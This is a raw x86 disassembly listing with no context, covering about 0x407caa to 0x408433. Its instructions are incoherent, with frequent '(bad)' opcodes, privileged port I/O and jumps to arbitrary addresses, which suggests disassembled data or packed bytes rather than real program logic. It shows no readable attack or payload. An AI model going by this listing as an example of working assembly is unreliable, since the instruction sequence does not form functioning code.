  407caa:	rol    BYTE PTR [edx+0x7b],1
  407cad:	jg     0x407c44
  407caf:	lahf   
  407cb0:	jns    0x407ce1
  407cb2:	fild   DWORD PTR [ebx-0x5907012b]
  407cb8:	pop    esp
  407cb9:	nop
  407cba:	das    
  407cbb:	and    BYTE PTR [ecx],bl
  407cbd:	dec    esi
  407cbe:	fwait
  407cbf:	or     esi,DWORD PTR [ecx+0x39]
  407cc2:	push   esi
  407cc3:	outs   dx,BYTE PTR ds:[esi]
  407cc4:	cmc    
  407cc5:	lock fcomp st(6)
  407cc8:	pop    eax
  407cc9:	jmp    0x407ce3
  407ccb:	push   ds
  407ccc:	mov    ebp,0x711ce23
  407cd1:	cmp    BYTE PTR [edx+ebx*1],bl
  407cd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cd5:	in     eax,dx
  407cd6:	jb     0x407c60
  407cd8:	in     eax,dx
  407cd9:	daa    
  407cda:	mov    ebx,0xf4c46f0f
  407cdf:	push   es
  407ce0:	sar    DWORD PTR [esi+0x2cf0ca62],cl
  407ce6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ce7:	mov    bl,0xab
  407ce9:	fsubr  DWORD PTR ds:0x25877d1
  407cef:	std    
  407cf0:	pop    es
  407cf1:	loop   0x407cc6
  407cf3:	sbb    al,0x17
  407cf5:	mov    ecx,0xd40b667
  407cfa:	jno    0x407ca4
  407cfc:	out    0xd4,al
  407cfe:	sbb    bh,ch
  407d00:	dec    ebx
  407d01:	in     al,dx
  407d02:	imul   ebx,DWORD PTR [ebx],0xfffffffb
  407d05:	sbb    DWORD PTR [ecx+0x4c],esi
  407d08:	fmul   QWORD PTR [eax]
  407d0a:	cmp    DWORD PTR [edi+0x1c],0x32
  407d0e:	pop    ecx
  407d0f:	sti    
  407d10:	sti    
  407d11:	bound  ecx,QWORD PTR [eax-0x4d]
  407d14:	inc    ecx
  407d15:	adc    DWORD PTR [edx],0xffffffc8
  407d18:	adc    DWORD PTR [esp+edi*2],0xffffffdc
  407d1c:	inc    ecx
  407d1d:	dec    ecx
  407d1e:	in     eax,dx
  407d1f:	dec    esi
  407d20:	pop    esi
  407d21:	inc    ebx
  407d22:	cmp    ebp,ecx
  407d24:	and    BYTE PTR [edx+0x773fda17],al
  407d2a:	jo     0x407d64
  407d2c:	pop    eax
  407d2d:	sbb    DWORD PTR [edx],edx
  407d2f:	nop
  407d30:	cdq    
  407d31:	dec    ecx
  407d32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d33:	xchg   edi,eax
  407d34:	adc    BYTE PTR [ebx],ah
  407d36:	mov    edx,0x441bceb8
  407d3b:	loop   0x407da1
  407d3d:	adc    esi,DWORD PTR [edi+ebx*2+0x72]
  407d41:	mov    al,ds:0x9a0d4c78
  407d46:	or     esp,DWORD PTR [ecx+0x202420e3]
  407d4c:	xlat   BYTE PTR ds:[ebx]
  407d4d:	sbb    eax,0xafa25bf3
  407d52:	sti    
  407d53:	fs mov ecx,0xfa3781ac
  407d59:	add    eax,0x8b65d9e9
  407d5e:	stos   DWORD PTR es:[edi],eax
  407d5f:	mov    ecx,0xb43507b3
  407d64:	adc    dh,BYTE PTR [ebx+0x52]
  407d67:	adc    DWORD PTR [ebp+0x17],ebp
  407d6a:	mov    dh,0xd7
  407d6c:	stc    
  407d6d:	arpl   WORD PTR [eax+0x78],ax
  407d70:	push   ss
  407d71:	pop    esp
  407d72:	or     ah,BYTE PTR [edi-0x76be44bc]
  407d78:	std    
  407d79:	leave  
  407d7a:	jns    0x407db1
  407d7c:	leave  
  407d7d:	and    bh,BYTE PTR [ecx+0x237e70d6]
  407d83:	std    
  407d84:	inc    esp
  407d85:	xlat   BYTE PTR ds:[ebx]
  407d86:	jle    0x407d73
  407d88:	pop    esp
  407d89:	mov    dl,BYTE PTR [edx-0x52]
  407d8c:	xchg   edx,eax
  407d8d:	inc    edx
  407d8e:	xchg   esp,eax
  407d8f:	loop   0x407e09
  407d91:	push   edx
  407d92:	call   0xb2a80934
  407d97:	in     al,0x63
  407d99:	hlt    
  407d9a:	pop    edx
  407d9b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d9c:	cdq    
  407d9d:	into   
  407d9e:	in     al,dx
  407d9f:	adc    cl,dh
  407da1:	jb     0x407e07
  407da3:	push   0x4836e26a
  407da8:	pop    edi
  407da9:	fst    DWORD PTR [ebx+0x55666e95]
  407daf:	jecxz  0x407e27
  407db1:	sbb    DWORD PTR ds:0x77aec29d,esi
  407db7:	mov    ebp,0xb1aa9969
  407dbc:	or     eax,0x6c86d034
  407dc1:	mov    dh,0xa
  407dc3:	jecxz  0x407dc5
  407dc5:	iret   
  407dc6:	(bad)
  407dc9:	jae    0x407de1
  407dcb:	jno    0x407dca
  407dcd:	in     al,dx
  407dce:	std    
  407dcf:	or     al,0xa7
  407dd1:	adc    eax,0x167e83cc
  407dd6:	(bad)  
  407dd7:	cs dec ebp
  407dd9:	cs sti 
  407ddb:	stc    
  407ddc:	mov    ebp,0x41db346d
  407de1:	dec    esp
  407de2:	dec    edi
  407de3:	dec    esp
  407de4:	aad    0x66
  407de6:	mov    al,ds:0xd8b6967a
  407deb:	fdivr  DWORD PTR [edx+eax*4+0x30]
  407def:	sub    al,0xe7
  407df1:	out    0xca,eax
  407df3:	xor    dl,bl
  407df5:	mov    DWORD PTR [edi-0x5aec4d18],edi
  407dfb:	outs   dx,BYTE PTR ds:[esi]
  407dfc:	daa    
  407dfd:	push   0x89bfc282
  407e02:	out    dx,al
  407e03:	inc    esi
  407e04:	daa    
  407e05:	push   ecx
  407e06:	xchg   edx,eax
  407e07:	mov    esp,0x7646cf68
  407e0c:	mov    BYTE PTR [ebp-0x4a1618b9],0x58
  407e13:	out    0xdf,eax
  407e15:	js     0x407dae
  407e17:	mov    al,ds:0xf4d52792
  407e1c:	lea    ecx,[ecx]
  407e1e:	iret   
  407e1f:	xchg   edx,eax
  407e20:	ins    BYTE PTR es:[edi],dx
  407e21:	inc    eax
  407e22:	cmp    cl,ch
  407e24:	mov    ds:0x8c7a8e0a,eax
  407e29:	sbb    eax,0xc8afdf76
  407e2e:	mov    bl,0x89
  407e30:	dec    ebx
  407e31:	cmp    BYTE PTR [ebp+0x6ca7f3c6],cl
  407e37:	pop    edx
  407e38:	or     bh,ch
  407e3a:	fwait
  407e3b:	fwait
  407e3c:	sub    al,0x85
  407e3e:	pop    edi
  407e3f:	test   BYTE PTR [eax+0x1b1b061],0x32
  407e46:	sahf   
  407e47:	or     al,0xc4
  407e49:	lods   al,BYTE PTR ds:[esi]
  407e4a:	into   
  407e4b:	dec    eax
  407e4c:	imul   ebp,eax,0x99dbea37
  407e52:	imul   ebx,ecx,0xfffffff4
  407e55:	dec    edx
  407e56:	mov    ch,0x90
  407e58:	pop    esi
  407e59:	les    esp,FWORD PTR ds:0x6ebbbfe6
  407e5f:	sbb    BYTE PTR [edx-0x54b24c83],dh
  407e65:	xchg   edx,eax
  407e66:	jae    0x407e7e
  407e68:	jmp    0xcb92:0xef2b8c4a
  407e6f:	cmp    al,0x99
  407e71:	or     al,0xf8
  407e73:	dec    edi
  407e74:	popa   
  407e75:	fldl2t 
  407e77:	cli    
  407e78:	shl    DWORD PTR [ebx+0x4265c262],0x3d
  407e7f:	jne    0x407ed1
  407e81:	mov    ds:0x82dd729f,eax
  407e86:	bound  esi,QWORD PTR [esi]
  407e88:	fsub   DWORD PTR [ebx+0x1245bb96]
  407e8e:	mov    esp,0x7f36fb3e
  407e93:	or     edx,ecx
  407e95:	retf   
  407e96:	loope  0x407ebb
  407e98:	push   ecx
  407e99:	xlat   BYTE PTR ds:[ebx]
  407e9a:	fcomp  QWORD PTR [esi-0x45672813]
  407ea0:	and    DWORD PTR [esi-0x68],0x72
  407ea4:	mov    esp,0xdc9a0957
  407ea9:	mov    ebp,0xaaf37500
  407eae:	push   ss
  407eaf:	or     al,0x60
  407eb1:	aad    0xd9
  407eb3:	or     eax,0xa8d864db
  407eb8:	mov    ebp,0x6ff83b10
  407ebd:	push   ds
  407ebe:	inc    ebp
  407ebf:	cmp    ebp,DWORD PTR [edx]
  407ec1:	iret   
  407ec2:	sbb    bl,bh
  407ec4:	rol    BYTE PTR [esi],0x25
  407ec7:	inc    ebx
  407ec8:	xor    al,BYTE PTR [ebp+esi*1+0x32e13e85]
  407ecf:	cmp    BYTE PTR [ebp-0x4a],bl
  407ed2:	std    
  407ed3:	pusha  
  407ed4:	test   al,0xb6
  407ed6:	add    cl,ch
  407ed8:	xchg   ecx,eax
  407ed9:	and    DWORD PTR [edx+edx*8-0x749397f3],0xffffff9f
  407ee1:	mov    eax,0xe43acc95
  407ee6:	mov    esi,0xb7bd3e71
  407eeb:	out    0xe,eax
  407eed:	push   ebp
  407eee:	mov    edi,0x80f74bff
  407ef3:	xchg   esp,eax
  407ef4:	repnz pop ebp
  407ef6:	inc    ecx
  407ef7:	fs loopne 0x407eb8
  407efa:	push   cs
  407efb:	xchg   ebx,eax
  407efc:	sub    BYTE PTR [ebp+0x3e],dl
  407eff:	sbb    BYTE PTR [edx-0x2c],ah
  407f02:	bound  eax,QWORD PTR [ecx+0x15e6e732]
  407f08:	push   esi
  407f09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f0a:	jnp    0x407efa
  407f0c:	retf   0x84ca
  407f0f:	add    ah,al
  407f11:	push   0x66
  407f13:	popa   
  407f14:	fstp   DWORD PTR [eax+0x75a6d9e3]
  407f1a:	mov    al,0xf5
  407f1c:	sbb    al,0x29
  407f1e:	or     eax,edi
  407f20:	into   
  407f21:	xchg   ecx,eax
  407f22:	adc    bl,BYTE PTR [esi-0x4ad2dca2]
  407f28:	and    edi,ebp
  407f2a:	and    bh,dh
  407f2c:	rol    DWORD PTR [edx-0x476c09c6],1
  407f32:	fstp   DWORD PTR [esi+0x5d378790]
  407f38:	cmp    ecx,DWORD PTR [ebx]
  407f3a:	into   
  407f3b:	fst    DWORD PTR [ebx+0x66]
  407f3e:	pop    esi
  407f3f:	repz mov esp,0xf2e47d08
  407f45:	ins    DWORD PTR es:[edi],dx
  407f46:	ins    BYTE PTR es:[edi],dx
  407f47:	adc    al,0xfd
  407f49:	arpl   cx,di
  407f4b:	ret    0xf444
  407f4e:	sub    DWORD PTR [eax+0x5788feb3],ecx
  407f54:	cdq    
  407f55:	sbb    esi,DWORD PTR [ebp-0x43]
  407f58:	cmp    ebx,ebp
  407f5a:	mov    BYTE PTR [esi+0x71],bl
  407f5d:	xor    bh,dh
  407f5f:	mov    al,0x10
  407f61:	sub    DWORD PTR [ebx],esp
  407f63:	out    dx,al
  407f64:	jmp    0x407fc1
  407f66:	std    
  407f67:	shr    DWORD PTR [esp+esi*1-0x1d69dca2],1
  407f6e:	iret   
  407f6f:	pusha  
  407f70:	fimul  WORD PTR [esi+0x60a8845]
  407f76:	mov    eax,0x2ea59096
  407f7b:	jnp    0x407fea
  407f7d:	add    al,0x2e
  407f7f:	sbb    ecx,ecx
  407f81:	mov    ebx,0xb22c2c4b
  407f86:	mov    DWORD PTR [esi+edi*4+0x24],ebp
  407f8a:	dec    edi
  407f8b:	pop    eax
  407f8c:	imul   DWORD PTR [esi+0x71]
  407f8f:	shl    DWORD PTR [ebx+0xb],1
  407f92:	xlat   BYTE PTR ds:[ebx]
  407f93:	jno    0x407fac
  407f95:	mov    cl,0x6a
  407f97:	in     al,dx
  407f98:	out    dx,al
  407f99:	or     BYTE PTR [ebx],dl
  407f9b:	and    al,0xec
  407f9d:	(bad)  
  407f9f:	xor    al,BYTE PTR [edx]
  407fa1:	in     al,dx
  407fa2:	adc    DWORD PTR ss:[edx+edx*2+0xa],edx
  407fa7:	(bad)  
  407fa8:	not    eax
  407faa:	mov    edi,0xf56248c4
  407faf:	in     eax,0x14
  407fb1:	jecxz  0x407f64
  407fb3:	xor    BYTE PTR [edi-0x7e],0x22
  407fb7:	and    al,0x55
  407fb9:	fdivr  DWORD PTR [ecx+0x61]
  407fbc:	stc    
  407fbd:	sbb    dh,BYTE PTR [esi]
  407fbf:	pop    edi
  407fc0:	sti    
  407fc1:	push   eax
  407fc2:	dec    ebx
  407fc3:	or     ebx,DWORD PTR ss:[ecx+0x7e]
  407fc7:	cmp    BYTE PTR [edi+ebx*2-0x41a9f0f3],dh
  407fce:	jmp    0xee468b47
  407fd3:	jl     0x407fe7
  407fd5:	retf   0xad95
  407fd8:	mov    esi,0xa2b9773f
  407fdd:	and    BYTE PTR [esi],dl
  407fdf:	dec    edx
  407fe0:	std    
  407fe1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fe2:	mov    cl,0x9d
  407fe4:	shl    BYTE PTR [ebx+0x22],1
  407fe7:	or     esi,DWORD PTR [esi]
  407fe9:	icebp  
  407fea:	xor    BYTE PTR [edx-0x4a7facc8],bh
  407ff0:	adc    al,0x79
  407ff2:	push   cs
  407ff3:	in     eax,0xde
  407ff5:	je     0x40803b
  407ff7:	mov    cl,0x6b
  407ff9:	jp     0x408003
  407ffb:	ds mov edx,0x890f4c3a
  408001:	xchg   ebx,eax
  408002:	ja     0x407fc2
  408004:	ins    BYTE PTR es:[edi],dx
  408005:	and    BYTE PTR [edi+edi*2+0x9c31f43],cl
  40800c:	mov    ch,BYTE PTR [esi+0x2]
  40800f:	or     BYTE PTR [ecx-0x7940b9be],cl
  408015:	rcr    DWORD PTR [eax+0x42a886ef],cl
  40801b:	mov    cl,0x1a
  40801d:	not    DWORD PTR [edi]
  40801f:	popa   
  408020:	fcmovne st,st(3)
  408022:	inc    ecx
  408023:	shr    BYTE PTR [ebx+0x653eee01],1
  408029:	xor    DWORD PTR [ebx+0x71],edx
  40802c:	daa    
  40802d:	or     BYTE PTR [edx-0x3b],bh
  408030:	fist   DWORD PTR [ecx-0x6f]
  408033:	inc    esi
  408034:	xchg   DWORD PTR [edi-0x28],esp
  408037:	pop    ds
  408038:	call   edx
  40803a:	mov    ds:0xe6710b3,eax
  40803f:	sti    
  408040:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408041:	sbb    dh,BYTE PTR [edx]
  408043:	(bad)  
  408044:	or     DWORD PTR [eax-0x37def902],esi
  40804a:	(bad)  
  40804b:	sub    bl,BYTE PTR [ebx]
  40804d:	jge    0x407fe9
  40804f:	mul    DWORD PTR [edi]
  408051:	add    esi,DWORD PTR [esi+0x8]
  408054:	in     eax,dx
  408055:	or     eax,0xe2bd9ac
  40805a:	adc    DWORD PTR [eax],eax
  40805c:	pop    ebp
  40805d:	gs sti 
  40805f:	push   edx
  408060:	and    al,0xfc
  408062:	mov    cl,0x32
  408064:	xchg   ebp,eax
  408065:	sbb    ebx,ecx
  408067:	sub    al,0x63
  408069:	or     esi,ecx
  40806b:	aad    0x2b
  40806d:	pop    esi
  40806e:	mov    BYTE PTR [esi+0x27],bh
  408071:	pop    eax
  408072:	pop    ebx
  408073:	popa   
  408074:	jnp    0x4080f1
  408076:	xchg   edx,eax
  408077:	xchg   BYTE PTR [ebx],cl
  408079:	scas   eax,DWORD PTR es:[di]
  40807b:	out    dx,eax
  40807c:	xchg   esp,eax
  40807d:	test   al,0x81
  40807f:	aam    0x13
  408081:	xor    BYTE PTR cs:0x3379fe79,al
  408088:	les    esp,FWORD PTR [ebx]
  40808a:	dec    ecx
  40808b:	mov    ebp,0x555bd3a8
  408090:	loopne 0x40808f
  408092:	mov    ah,0xda
  408094:	ins    BYTE PTR es:[edi],dx
  408095:	or     BYTE PTR [ebx+0x7039355e],bl
  40809b:	push   ebx
  40809c:	aas    
  40809d:	add    dl,dh
  40809f:	imul   edi,ebx,0x11
  4080a2:	cmp    ch,BYTE PTR [ecx+ecx*1+0x2b661f8a]
  4080a9:	inc    edx
  4080aa:	mov    al,ds:0xf2fcb7ab
  4080af:	(bad)  
  4080b0:	in     eax,0x2a
  4080b2:	je     0x4080d6
  4080b4:	sub    esi,edx
  4080b6:	or     eax,0x7348f58c
  4080bb:	sub    bh,BYTE PTR [ecx+0x74d3dbc2]
  4080c1:	xchg   esp,eax
  4080c2:	sar    BYTE PTR [edi],0xa9
  4080c5:	popf   
  4080c6:	rcr    DWORD PTR [ebx],cl
  4080c8:	(bad)  
  4080c9:	call   FWORD PTR [edi]
  4080cb:	pushf  
  4080cc:	sbb    DWORD PTR [ebp+esi*8-0x50c5ee91],0x77
  4080d4:	ins    BYTE PTR es:[edi],dx
  4080d5:	jnp    0x408103
  4080d7:	inc    BYTE PTR [eax+edi*2-0x33]
  4080db:	dec    edx
  4080dc:	(bad)  
  4080de:	or     edx,ebp
  4080e0:	out    dx,al
  4080e1:	outs   dx,DWORD PTR ds:[esi]
  4080e2:	retf   
  4080e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080e4:	aad    0xb8
  4080e6:	push   edi
  4080e7:	add    eax,0x2ecb00d0
  4080ec:	rcl    BYTE PTR [ebp+0x4a34da12],cl
  4080f2:	sahf   
  4080f3:	cwde   
  4080f4:	(bad)  
  4080f5:	mov    eax,ds:0xc091ccc1
  4080fa:	addr16 pop edx
  4080fc:	dec    esp
  4080fd:	aas    
  4080fe:	das    
  4080ff:	(bad)  [ecx]
  408101:	push   esp
  408102:	sbb    BYTE PTR [ebx-0x26],ch
  408105:	or     edx,edx
  408107:	inc    ebx
  408108:	imul   BYTE PTR [ebp+0x20b27cea]
  40810e:	ror    DWORD PTR [edi-0x51],1
  408111:	les    ecx,FWORD PTR [esi-0xb]
  408114:	nop
  408115:	push   edx
  408116:	icebp  
  408117:	pop    ebp
  408118:	and    ch,cl
  40811a:	cmp    DWORD PTR [ebx],eax
  40811c:	cmp    ah,dh
  40811e:	xchg   edi,eax
  40811f:	push   ecx
  408120:	inc    esi
  408121:	daa    
  408122:	fadd   QWORD PTR [ebx]
  408124:	sub    dh,al
  408126:	add    al,0x13
  408128:	mov    ds:0xe0e42442,al
  40812d:	mov    ecx,0xf4fdbfb3
  408132:	cmp    ecx,esi
  408134:	repnz mov cl,0xe0
  408137:	or     DWORD PTR [esi-0x3a],eax
  40813a:	sub    eax,0xb7f1ee72
  40813f:	xor    BYTE PTR ds:[ecx-0x30ed0309],al
  408146:	or     eax,eax
  408148:	or     al,0x51
  40814a:	out    0x8d,eax
  40814c:	jo     0x4080d9
  40814e:	or     DWORD PTR [ebx],ebp
  408150:	rcl    bl,0x6d
  408153:	mov    dh,BYTE PTR [edi-0x1b]
  408156:	es out 0x11,eax
  408159:	gs hlt 
  40815b:	pop    edi
  40815c:	in     al,0xd4
  40815e:	(bad)  
  40815f:	xacquire xchg DWORD PTR [eiz*4-0x117b4086],ebp
  408167:	xchg   ecx,eax
  408168:	mov    ah,0x71
  40816a:	jecxz  0x4081b2
  40816c:	mov    ds,WORD PTR [eax+edi*8-0x4f]
  408170:	in     eax,0xb
  408172:	ins    DWORD PTR es:[edi],dx
  408173:	in     eax,dx
  408174:	dec    ebx
  408175:	mov    edi,0x38e915f0
  40817a:	cmp    ecx,0xffffffd1
  40817d:	pop    es
  40817e:	add    eax,0xe0fcc960
  408183:	pop    es
  408184:	nop
  408185:	fsubr  DWORD PTR [eax+eax*1-0x46]
  408189:	mov    gs,WORD PTR [ebp-0x33]
  40818c:	push   ebx
  40818d:	jb     0x408196
  40818f:	test   al,0x6d
  408191:	add    ecx,ebp
  408193:	jbe    0x4081da
  408195:	lds    esi,FWORD PTR [esi+edx*1]
  408198:	sub    al,0x46
  40819a:	push   0xffffffb1
  40819c:	or     esp,ecx
  40819e:	cli    
  40819f:	dec    ebp
  4081a0:	pop    edx
  4081a1:	and    ch,bh
  4081a3:	inc    ebp
  4081a4:	mov    BYTE PTR [edx+0x35eafcd6],dl
  4081aa:	add    BYTE PTR [ebx+ecx*8+0x254bec18],ch
  4081b1:	push   ds
  4081b2:	int3   
  4081b3:	jb     0x408228
  4081b5:	jmp    0x97d8384e
  4081ba:	pop    ebp
  4081bb:	neg    BYTE PTR [ebp+eiz*8-0x2684bea5]
  4081c2:	inc    ecx
  4081c3:	ret    0x3c92
  4081c6:	in     al,dx
  4081c7:	int    0xd5
  4081c9:	mov    ch,0xef
  4081cb:	out    dx,al
  4081cc:	int3   
  4081cd:	jmp    0xa9c95ebf
  4081d2:	pop    ebx
  4081d3:	add    DWORD PTR [edi-0x6cc55956],edx
  4081d9:	push   eax
  4081da:	push   esi
  4081db:	jp     0x4081aa
  4081dd:	ds ja  0x4081de
  4081e0:	ss push ebp
  4081e2:	fidiv  DWORD PTR [edi+0x51]
  4081e5:	xor    esi,DWORD PTR [eax]
  4081e7:	inc    ebp
  4081e8:	in     al,dx
  4081e9:	push   0x267e042f
  4081ee:	loopne 0x408265
  4081f0:	imul   DWORD PTR [edx]
  4081f2:	mov    eax,0x223eca0
  4081f7:	outs   dx,DWORD PTR ds:[esi]
  4081f8:	mov    esi,0x404af679
  4081fd:	gs inc edx
  4081ff:	nop
  408200:	aam    0xb6
  408202:	sub    esi,DWORD PTR [esi-0x34905459]
  408208:	xlat   BYTE PTR ds:[ebx]
  408209:	stos   DWORD PTR es:[edi],eax
  40820a:	xchg   edx,eax
  40820b:	aad    0x7
  40820d:	std    
  40820e:	cli    
  40820f:	outs   dx,DWORD PTR ds:[esi]
  408210:	sub    eax,0x78dcd17
  408215:	dec    eax
  408216:	ret    0x596d
  408219:	cmp    esi,DWORD PTR [edi+0x63]
  40821c:	imul   eax,DWORD PTR [ecx-0x656150d6],0xffffffc8
  408223:	ret    
  408224:	mov    WORD PTR [esi+0x2d],es
  408227:	scas   al,BYTE PTR es:[edi]
  408228:	pop    ds
  408229:	sbb    ebx,DWORD PTR [ecx+ecx*4-0x78]
  40822d:	mov    eax,DWORD PTR [edi-0x9]
  408230:	pop    ds
  408231:	sub    eax,esp
  408233:	pushf  
  408234:	(bad)  
  408235:	xchg   esi,eax
  408236:	or     DWORD PTR [ebx],eax
  408238:	jecxz  0x40823d
  40823a:	pop    es
  40823b:	add    bl,ch
  40823d:	or     eax,0xb19709da
  408242:	pop    ecx
  408243:	fwait
  408244:	es loop 0x4081e2
  408247:	add    ah,dl
  408249:	int3   
  40824a:	aaa    
  40824b:	pop    edx
  40824c:	sub    edi,DWORD PTR [esi+0x650801c8]
  408252:	and    eax,0x271b905b
  408257:	pushf  
  408258:	and    al,0x21
  40825a:	scas   eax,DWORD PTR es:[edi]
  40825b:	mov    ah,0x45
  40825d:	jmp    0x4082c5
  40825f:	pop    eax
  408260:	adc    al,0x81
  408262:	ret    0xfa21
  408265:	adc    al,0x29
  408267:	imul   esp,DWORD PTR [ebx-0x5b],0xffffff96
  40826b:	mov    dh,0xed
  40826d:	push   ds
  40826e:	mov    bl,0xe
  408270:	mov    edi,0xee7bda24
  408275:	rol    DWORD PTR [eax],1
  408277:	pop    ecx
  408278:	out    0x60,eax
  40827a:	bound  esi,QWORD PTR [esi-0x60]
  40827d:	pop    ebx
  40827e:	jnp    0x4082e0
  408280:	fnstsw WORD PTR [edx-0x65]
  408283:	lods   al,BYTE PTR ds:[esi]
  408284:	cld    
  408285:	test   DWORD PTR [ebp+0x38322902],ebp
  40828b:	gs mov cl,0xc8
  40828e:	scas   eax,DWORD PTR es:[edi]
  40828f:	mov    al,ds:0x5fca5996
  408294:	aad    0x39
  408296:	push   ebx
  408297:	in     al,0x99
  408299:	sbb    al,0x9a
  40829b:	mov    WORD PTR [ebx+0x4],fs
  40829e:	call   DWORD PTR ds:0xbdcf571a
  4082a4:	pushf  
  4082a5:	dec    ebp
  4082a6:	popf   
  4082a7:	jmp    0x408238
  4082a9:	jecxz  0x408263
  4082ab:	neg    DWORD PTR [edi-0x1f]
  4082ae:	imul   ebx,ecx,0xffffffd0
  4082b1:	mov    ebp,0x91f5c7cd
  4082b6:	sbb    cl,BYTE PTR ds:0x1623195f
  4082bc:	inc    esp
  4082bd:	add    edi,DWORD PTR [edx]
  4082bf:	ins    DWORD PTR es:[edi],dx
  4082c0:	icebp  
  4082c1:	inc    esi
  4082c2:	pop    es
  4082c3:	mov    ah,0xa9
  4082c5:	add    cl,BYTE PTR [ebx+0x1c]
  4082c8:	mov    ch,ah
  4082ca:	xor    ebp,DWORD PTR [eax+esi*4+0x10]
  4082ce:	ds out dx,al
  4082d0:	xchg   esp,eax
  4082d1:	inc    eax
  4082d2:	pop    edi
  4082d3:	jns    0x408349
  4082d5:	aas    
  4082d6:	and    eax,0x12ca9242
  4082db:	out    0x72,al
  4082dd:	pop    ss
  4082de:	fdiv   DWORD PTR [eax+0x7a]
  4082e1:	arpl   WORD PTR [edi+0x2ee30a57],cx
  4082e7:	add    ch,bh
  4082e9:	addr16 pop ecx
  4082eb:	push   0xaf4a6d38
  4082f0:	je     0x408362
  4082f2:	mov    ecx,0xa394075e
  4082f7:	retf   
  4082f8:	dec    ebp
  4082f9:	and    BYTE PTR [ebx+ebx*8+0x5f38bfc9],al
  408300:	push   esp
  408301:	mov    bl,0x82
  408303:	repz iret 
  408305:	jle    0x4082c8
  408307:	test   eax,0x21fa8f7b
  40830c:	fwait
  40830d:	mov    edi,0x66afab62
  408312:	jecxz  0x4082ae
  408314:	arpl   WORD PTR [ebp+ebp*4-0x19],di
  408318:	dec    ebx
  408319:	aaa    
  40831a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40831b:	and    bl,BYTE PTR [ebx-0x3a9efae7]
  408321:	mov    bl,0xcc
  408323:	loopne 0x4082b1
  408325:	jbe    0x40832f
  408327:	jle    0x4082d8
  408329:	fistp  QWORD PTR [eax-0x4f]
  40832c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40832d:	aaa    
  40832e:	js     0x408379
  408330:	mov    WORD PTR [edi],?
  408332:	in     eax,dx
  408333:	mov    al,0xf1
  408335:	sub    BYTE PTR [edx],bh
  408337:	test   DWORD PTR [esp+ebx*4+0x734fc003],eax
  40833e:	sbb    al,0x85
  408340:	retf   0x79ce
  408343:	sub    ah,BYTE PTR [edi]
  408345:	mov    dh,0xa1
  408347:	or     cl,BYTE PTR [ebx]
  408349:	adc    eax,0x2550a493
  40834e:	add    al,0x8d
  408350:	lods   al,BYTE PTR ds:[esi]
  408351:	inc    eax
  408352:	or     al,0x62
  408354:	xor    DWORD PTR [edi+eax*4-0xaf87127],esi
  40835b:	jno    0x4083a0
  40835d:	test   BYTE PTR [esi-0x3ef3043e],ch
  408363:	(bad)  
  408364:	pop    eax
  408365:	sbb    ch,BYTE PTR [edx]
  408367:	sti    
  408368:	mov    WORD PTR [edx+0x6],ds
  40836b:	js     0x40838c
  40836d:	daa    
  40836e:	outs   dx,BYTE PTR ds:[esi]
  40836f:	push   di
  408371:	or     al,0x52
  408373:	imul   esp,esp,0x4
  408376:	pop    edx
  408377:	gs dec ebx
  408379:	int    0xdf
  40837b:	xchg   ebp,eax
  40837c:	and    cl,bl
  40837e:	and    BYTE PTR [ecx+0x21bea55f],dl
  408384:	retf   0xa089
  408387:	xchg   esp,eax
  408388:	cmp    al,0x66
  40838a:	push   ecx
  40838b:	out    0x4f,al
  40838d:	or     al,0x92
  40838f:	xchg   esp,eax
  408390:	sub    BYTE PTR [eax],ch
  408392:	fs cdq 
  408394:	mov    ch,0x63
  408396:	outs   dx,DWORD PTR ds:[esi]
  408397:	jne    0x4083d5
  408399:	daa    
  40839a:	sbb    cl,BYTE PTR [ecx]
  40839c:	inc    eax
  40839d:	push   esp
  40839e:	retf   0xa4cf
  4083a1:	aas    
  4083a2:	lods   al,BYTE PTR ds:[esi]
  4083a3:	loope  0x408389
  4083a5:	dec    esi
  4083a6:	push   ebx
  4083a7:	loope  0x408359
  4083a9:	pop    esp
  4083aa:	xchg   esp,eax
  4083ab:	div    BYTE PTR [ecx-0x43]
  4083ae:	std    
  4083af:	inc    edi
  4083b0:	(bad)  
  4083b2:	or     BYTE PTR [bx+di+0x4ce0],al
  4083b7:	pop    eax
  4083b8:	sbb    dh,BYTE PTR [esi+0x29ce2b09]
  4083be:	jl     0x40843b
  4083c0:	xor    eax,DWORD PTR [edx+0x63fbecd6]
  4083c6:	mov    eax,0x1149b9a5
  4083cb:	popa   
  4083cc:	ret    0x96c2
  4083cf:	pop    edi
  4083d0:	adc    dl,0x4f
  4083d3:	sub    al,cl
  4083d5:	jl     0x40836a
  4083d7:	adc    BYTE PTR [ebx],cl
  4083d9:	push   ds
  4083da:	scas   al,BYTE PTR es:[edi]
  4083db:	js     0x408418
  4083dd:	push   0x8d3551a0
  4083e2:	mov    DWORD PTR [ebp+0x76ae030c],esp
  4083e8:	in     al,0x9a
  4083ea:	fwait
  4083eb:	stos   BYTE PTR es:[edi],al
  4083ec:	enter  0xf87b,0x78
  4083f0:	aam    0x35
  4083f2:	lahf   
  4083f3:	pop    esi
  4083f4:	inc    esi
  4083f5:	out    0x8,eax
  4083f7:	loopne 0x4083eb
  4083f9:	sahf   
  4083fa:	daa    
  4083fb:	cmp    al,0x68
  4083fd:	mov    eax,ds:0xca3e50f0
  408402:	test   BYTE PTR [edx+0x56],ah
  408405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408406:	inc    esi
  408407:	fst    QWORD PTR [eax]
  408409:	and    BYTE PTR [eax+0x61856470],dh
  40840f:	int3   
  408410:	and    BYTE PTR [esi+edx*2+0x370bef15],dh
  408417:	fbstp  TBYTE PTR [ebx+0xb608a8d]
  40841d:	lock inc esp
  40841f:	ss jl  0x408480
  408422:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408423:	pop    esi
  408424:	mov    dl,0xa
  408426:	nop
  408427:	ret    
  408428:	ja     0x408421
  40842a:	daa    
  40842b:	fs push eax
  40842d:	aas    
  40842e:	mov    esi,0xe42c03a
  408433:	enter  0x8f76,0xfb
